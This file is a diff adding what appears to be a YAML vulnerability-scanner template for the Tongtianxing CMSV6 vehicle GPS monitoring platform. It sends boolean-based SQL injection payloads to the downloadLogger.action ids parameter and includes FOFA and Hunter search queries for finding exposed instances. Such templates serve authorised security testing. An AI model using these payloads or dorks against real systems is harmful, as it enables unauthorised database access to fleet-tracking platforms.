@@ -1,0 +1,25 @@
+name: TTXCMS-GPS-sqli       
+rules:    
+  - method: GET   
+    path: "/run_stop/delete.do;downloadLogger.action?ids=(SELECT%20(CASE%20WHEN%20(1=1)%20THEN%201%20ELSE%20(SELECT%209514%20UNION%20SELECT%205174)%20END))"
+    headers:
+    body:            
+    expression:                        
+      status_code:                
+      response_header:              
+      response_body: "OK"
+  - method: GET   
+    path: "/run_stop/delete.do;downloadLogger.action?ids=(SELECT%20(CASE%20WHEN%20(1=2)%20THEN%201%20ELSE%20(SELECT%209514%20UNION%20SELECT%205174)%20END))"
+    headers:
+    body:            
+    expression:                        
+      status_code:                
+      response_header:              
+      response_body: "服务器异常"
+detail:                          
+  description: "通天星CMSV6车载定位监控平台拥有以位置服务、无线3G/4G视频传输、云存储服务为核心的研发团队，专注于为定位、无线视频终端产品提供平台服务，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。通天星CMSV6车载定位监控平台 downloadLogger.action?ids接口处存在SQL注入漏洞"
+  search:             
+    fofa: body="/808gps/"
+    鹰图: web.body="/808gps/"
+
+
